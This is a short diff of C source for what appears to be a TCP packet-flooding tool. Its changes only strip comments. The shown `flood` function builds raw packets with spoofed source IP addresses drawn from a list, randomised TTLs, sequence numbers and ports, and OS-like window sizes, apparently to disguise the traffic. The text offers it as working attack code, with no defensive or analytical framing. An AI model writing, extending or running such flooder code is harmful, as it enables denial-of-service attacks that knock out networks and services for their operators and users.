@@ -150,8 +150,6 @@ void setup_tcp_header(struct tcphdr *tcph)
         tcph->doff = 5;
 }
 
-// int ctos[3] = {0, 40, 72};
-
 int windows[5] = {
     8192, 14600, 29200, 64240, 65535};
 
@@ -320,10 +318,8 @@ void *flood(void *par1)
                 tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
                 tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpopts)) / 4;
                 tcph->dest = htons(floodport);
-                iph->ttl = randnum(64, 255); // TTL values of windows devices vary from 64 all the way up to 182
+                iph->ttl = randnum(64, 255);
                 iph->saddr = htonl(class[rand_cmwc() % 480]);
-                // Random src ip
-                // iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
                 iph->id = htonl(rand_cmwc() & 0xFFFF);
                 iph->check = csum((unsigned short *)datagram, iph->tot_len);
                 tcph->source = htons(rand_cmwc() & 0xFFFF);
